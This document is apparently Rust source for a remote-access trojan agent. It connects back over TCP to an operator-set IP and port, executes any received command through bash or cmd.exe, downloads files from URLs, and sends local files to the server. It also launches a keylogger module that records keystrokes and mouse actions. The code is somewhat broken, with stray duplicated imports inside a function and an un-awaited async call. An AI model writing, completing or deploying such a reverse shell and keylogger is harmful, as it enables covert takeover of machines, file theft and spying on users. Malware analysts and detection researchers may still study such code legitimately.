use std::net::{Ipv4Addr,SocketAddrV4,TcpListener,TcpStream,Shutdown};
use std::process::{Command,exit};
use std::io::{self, Write, BufReader, BufRead};
use std::process::Output;
use std::env;

use clap::{App, Arg};
mod keylogger;

fn executecmd(cmd: &str) -> String {
    let client_os: (&str, &str);
    if cfg!(target_os = "windows") {
        client_os = ("cmd.exe", "/c");
    } else {
        client_os = ("/bin/bash", "-c");
    }
    let mut cmd_parts = vec![client_os.1, cmd];
    let extra_args: bool = cmd.contains(' ');

    let change_dir: bool = if extra_args {
        cmd_parts[1] == "cd"
    } else {
        false
    };
    let mut change_dir: bool = false;
    if extra_args {
        cmd_parts = cmd.split(" ").collect();
        change_dir = if extra_args {
            cmd_parts[0] == "cd"
        } else {
            false
        };
        if let Some(last_cmd) = cmd_parts.last_mut() {
            
            *last_cmd = last_cmd.trim_end_matches("\r\n");
        }   
    }
    else {
        cmd_parts = cmd.split("\r").collect();
    }

    let mut stdout = String::new();
    let mut stderr = String::new();
    if change_dir {
        let dir = cmd_parts[1].to_string();
        println!("Moving dir: {}",dir);
        if std::env::set_current_dir(dir.trim()).is_ok() {
            let success = "New directory:";
            stdout = [success, &dir].join(" ");
        } else {
            stderr = "Could not change directory".to_owned();
        }
    } else {
        
        let joined_commands = vec![cmd_parts.join(" ")];
        let res: Output = Command::new(client_os.0).args([client_os.1]).args(joined_commands).output().unwrap();
        println!("res is: {:?}", res);
        stdout = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
        stderr = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
    }
    if stdout.len() > 0 {
        stdout
    } else {
        stderr
    }
}
use std::io::{Read};
use std::path::Path;
use tokio::time::{Duration};
use std::fs::Metadata;
fn handle_client_tx(stream: &mut TcpStream, filename: & str) -> std::io::Result<()> { //receiveing from server
    println!("Creating file {}", filename.replace('\n', "").replace('\r', ""));

    // Get File contentsuse std::io::{Read};
use std::path::Path;
use tokio::time::{Duration};
use std::fs::Metadata;
    let mut file = File::create(filename.replace('\n', "").replace('\r', "")).unwrap();
    let mut buffer = [0; 1024];
    let mut total_bytes_read = 0;

    // Get the expected file size
    println!("getting expec");
    let expected_file_size = fs::metadata(filename.replace('\n', "").replace('\r', ""))?.len();

    loop {
        let bytes_read = stream.read(&mut buffer)?;
        if bytes_read == 0 {
            println!("breaking in loop of tx");
            break;
        }
        total_bytes_read += bytes_read;
        file.write_all(&buffer[..bytes_read])?;
        if total_bytes_read >= expected_file_size.try_into().unwrap() {
            // File transfer complete, close the file and return
            file.flush()?;
            return Ok(());
        }
        }
    Err(std::io::Error::new(
        std::io::ErrorKind::Other,
        "File transfer incomplete",
    ))
}

use std::fs;
use std::io::prelude::*;
fn send_to_server(socket:&mut TcpStream, filename: & str) -> std::io::Result<()> {
    let file_path = Path::new(filename);
    let mut file = File::open(&file_path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents);
    let mut socket = socket;

    // Send file name
    let filename = file_path.file_name().unwrap().to_str().unwrap();
    let filename_bytes = filename.as_bytes();
    let filename_len = filename_bytes.len();

    println!(
        "Sent filenm with {:?} bytes and contents: {}",
        filename_bytes,
        String::from_utf8_lossy(&filename_bytes)
    );

    // Send file contents
    let contents_len = contents.len();
    socket.write_all(&contents)?;

    println!(
        "Sent file with {} bytes and contents: {}",
        contents_len,
        String::from_utf8_lossy(&contents)
    );
    Ok(())
}
use std::cmp::min;
use std::fs::{File, OpenOptions};
use std::io::{Seek};
use reqwest::Client;
use indicatif::{ProgressBar, ProgressStyle};
use futures_util::StreamExt;

pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(), String> {
    let res = client
        .get(url)
        .send()
        .await
        .or(Err(format!("Failed to GET from '{}'", &url)))?;
    let total_size = res
        .content_length()
        .ok_or(format!("Failed to get content length from '{}'", &url))?;

    let pb = ProgressBar::new(total_size);
    pb.set_style(ProgressStyle::default_bar()
        .template("{msg}\n{spinner:.green} [{elapsed_precise}] [{wide_bar:.white/blue}] {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
        .progress_chars("█  "));
    pb.set_message(&format!("Downloading {}", url));

    let mut file;
    let mut downloaded: u64 = 0;
    let mut stream = res.bytes_stream();
    
    println!("Seeking in file.");
    if std::path::Path::new(path).exists() {
        println!("File exists. Resuming.");
        file = std::fs::OpenOptions::new()
            .read(true)
            .append(true)
            .open(path)
            .unwrap();

        let file_size = std::fs::metadata(path).unwrap().len();
        file.seek(std::io::SeekFrom::Start(file_size)).unwrap();
        downloaded = file_size;

    } else {
        println!("Fresh file..");
        file = File::create(path).or(Err(format!("Failed to create file '{}'", path)))?;
    }

    println!("Commencing transfer");
    while let Some(item) = stream.next().await {
        let chunk = item.or(Err(format!("Error while downloading file")))?;
        file.write(&chunk)
            .or(Err(format!("Error while writing to file")))?;
        let new = min(downloaded + (chunk.len() as u64), total_size);
        downloaded = new;
        pb.set_position(new);
    }
    pb.finish_with_message(&format!("Downloaded {} to {}", url, path));
    return Ok(());
}

#[tokio::main]
async fn main() {
    let ipaddy = match env::var("AGENT_IP") {
        Ok(val) => val,
        Err(_) => "127.0.0.1".to_string(),
    };
    let port = match env::var("AGENT_PORT") {
        Ok(val) => val,
        Err(_) => "9001".to_string(),
    };
    println!("Your agent is looking to connect back to: {}", ipaddy);
    println!("With port: {}", port);
    let port2 = "9001".to_string(); // for tx and rx of files
    
    let serveraddress = format!("{}:{}",ipaddy,port);
    let mut client =TcpStream::connect(serveraddress).unwrap();
    println!("Connected to: {}", client.peer_addr().unwrap());
    
    loop{
        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);
        println!("recieved from server: {}", String::from_utf8_lossy(&buffer).trim());
        let text : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
        
        if buffer.len()==0 ||
        &text=="quit"{
            println!("break");
            break;
        }

        if &text=="dl"{
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("recieved from server in dl mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("downloading files...");
            download_file(&Client::new(), &urltext, &fntext).await.unwrap();
            println!("files downloaded...");
        }

        else if &text=="tx"{ //downloading from server 
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("recieving files... {}", fntext);
            handle_client_tx(&mut client, &fntext);
            println!("files downloaded...");
            let mut output =String::from("").to_string();
            output.push('\0');
            client.write(&mut output.as_bytes());
        }
        
        else if &text=="rx"{ //uploading to server 
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("recieved from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
            println!("sending files...");
            send_to_server(&mut client, &fntext);
            println!("sent to server...");
        }
        
        else if &text=="logger"{ //start logging
            let mut buffer:Vec<u8> = Vec::new();
            println!("recieved from server in logger mode 1: {}", String::from_utf8_lossy(&buffer).trim());
            println!("starting logger ...");
            startlog();
            continue;
        }
        
        else {
            let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
            output.push('\0');
            client.write(&mut output.as_bytes());
        }
    }
    client.shutdown(Shutdown::Both);
}

async fn startlog() {
    let matches = App::new("keylogger")
        .version("0.1.2")
        .author("yourcomputer")
        .about("Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes")
        .arg(
            Arg::with_name("PATH")
                .help("File path")
                .index(1),
        )
        .get_matches();

    let path = matches.value_of("PATH").unwrap_or(".keylogger");

    keylogger::run(String::from(path));
}

